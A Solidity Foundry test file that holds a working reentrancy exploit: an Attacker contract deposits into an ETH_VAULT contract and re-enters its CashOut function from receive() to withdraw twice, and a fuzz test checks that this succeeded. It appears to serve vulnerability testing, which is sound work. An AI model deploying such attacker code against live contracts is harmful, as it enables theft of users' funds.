
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ETH_VAULT, Log} from "../src/ETH_VAULT_2.sol";

contract TestReentrancyETH_VAULT is Test {
    ETH_VAULT public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new ETH_VAULT(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        // Minimum deposit is 1 ether, so attackVal must be greater than 1 ether
        vm.assume(attackVal > 1 ether);
        vm.assume(attackVal <= 100 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The attacker needs to have a balance in the vault first

        // --- 3. Funding ---
        // Fund the Victim contract so it has ETH to steal
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker contract
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_VAULT public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = ETH_VAULT(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit funds into the vault to establish a balance
        // The deposit function requires msg.value > MinDeposit (1 ether)
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State
        initialSnapshot = address(this).balance;
        storedAttackVal = val;

        // 2. Call the vulnerable CashOut function
        // This will trigger the reentrancy via receive()
        victim.CashOut(val);

        // 3. Verify Success Conditions
        // The attack succeeded if we received more ETH than we should have
        // Due to reentrancy, we should have received val twice (2 * val)
        // but our balance in the contract should only have been decremented once or twice
        uint256 finalBalance = address(this).balance;
        uint256 victimBalanceRecord = victim.balances(address(this));
        
        // If reentrancy worked, we withdrew more than once before state was updated
        // So we should have received at least 2 * val, and the victim's record might be inconsistent
        if (finalBalance >= initialSnapshot + val && attackCallCount >= 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount < 2) {
            // Re-enter the CashOut function before the balance is updated
            // At this point, balances[attacker] still has the original value
            victim.CashOut(storedAttackVal);
        }
    }
}
